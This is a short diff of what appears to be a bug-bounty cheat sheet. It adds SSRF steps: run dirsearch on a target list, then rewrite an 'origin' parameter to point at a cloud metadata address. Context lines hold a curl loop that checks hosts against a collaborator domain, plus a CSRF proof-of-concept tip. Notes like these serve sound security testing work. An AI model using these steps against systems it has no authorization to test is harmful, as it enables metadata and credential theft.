@@ -809,6 +809,10 @@ SSRF through Curl
 ✔️cat ssrf.txt | while read host do;do curl -s -L $host -I|grep "http://bcollaborator.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
 
 
+python3 dirsearch.py -l targets.txt --deep-recursive
+if found example.com?origin=https://www.google.com
+convert it to example.com?origin=http://169.254.168.254/latest/metadata
+info disclousre via ssrf
 --------------------------------------------------------------------------------------------------
                                     CSRF
    1- if there is no csrftoken try to make poc with burpsuite and put it in server 
